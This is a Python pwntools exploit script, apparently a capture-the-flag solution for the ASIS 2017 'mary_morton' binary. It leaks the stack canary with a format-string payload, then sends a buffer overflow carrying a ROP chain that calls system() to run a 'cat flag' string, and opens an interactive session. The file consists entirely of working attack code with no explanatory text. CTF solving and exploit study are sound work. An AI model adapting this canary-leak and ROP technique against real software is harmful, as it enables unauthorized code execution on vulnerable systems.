from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./mary_morton")
else:
    conn = remote(HOST, PORT)

elf = ELF("./mary_morton")

context.log_level = 'debug'
gdb.attach(conn)

canary = ""

def leak_canary():
    log.info(" leak_canary")
    global canary
    print conn.recvuntil("3. Exit the battle")
    conn.sendline("2")
    conn.sendline("%23$p")

    m = conn.recvuntil("3. Exit the battle")
    canary = m.split("\n")[1]
    canary = int(canary, 16)
    print "[+] Canary value = ", hex(canary)

# 0x0000000000400ab3: Pop rdi; ret;
pop_rdi = 0x400ab3
string_cat_flag = 0x400B2B
system_plt = 0x4006a0

def bof_exploit():
    log.info(" bof_exploit")
    conn.sendline("1")

    global canary
    ROP = "A"*136
    ROP += p64(canary)
    ROP += "BBBBCCCC"
    ROP += p64(pop_rdi)
    ROP += p64(string_cat_flag)
    ROP += p64(system_plt)

    # exploit
    conn.sendline(ROP)

""" Here we go.
"""
log.info("[*] ASIS2017 mary_morton")

# Sync for debugging
raw_input("[*] Press enter key to start...")

# Exploit
leak_canary()
bof_exploit()

# End
conn.interactive()
